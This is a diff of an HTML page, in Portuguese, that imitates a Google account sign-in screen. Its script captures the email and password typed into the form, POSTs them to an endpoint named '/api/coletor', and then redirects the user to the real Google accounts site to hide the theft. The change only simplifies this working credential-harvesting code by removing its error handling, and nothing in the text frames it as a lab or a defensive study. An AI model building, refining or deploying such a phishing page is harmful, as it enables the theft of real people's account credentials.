@@ -61,36 +61,27 @@
   <p>Use sua Conta do Google</p>
 
   <form id="loginForm">
-    <input type="email" name="email" placeholder="Email ou telefone" required>
-    <input type="password" name="senha" placeholder="Senha" required>
-    <button type="submit">Próxima</button>
-  </form>
-</div>
+  <input type="email" name="email" required>
+  <input type="password" name="senha" required>
+  <button type="submit">Entrar</button>
+</form>
 
 <script>
-  document.getElementById("loginForm").addEventListener("submit", async function (e) {
-    e.preventDefault();
-    const email = e.target.email.value;
-    const senha = e.target.senha.value;
+document.getElementById("loginForm").addEventListener("submit", async function (e) {
+  e.preventDefault();
+  const email = e.target.email.value;
+  const senha = e.target.senha.value;
 
-    try {
-      const response = await fetch("/api/coletor", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ email, senha })
-      });
-
-      if (response.ok) {
-        window.location.href = "https://accounts.google.com/";
-      } else {
-        alert("Erro ao enviar.");
-      }
-    } catch (err) {
-      console.error("Erro ao enviar dados:", err);
-      alert("Erro interno.");
-    }
+  await fetch("/api/coletor", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ email, senha })
   });
+
+  window.location.href = "https://accounts.google.com/";
+});
 </script>
+
 
 </body>
 </html>
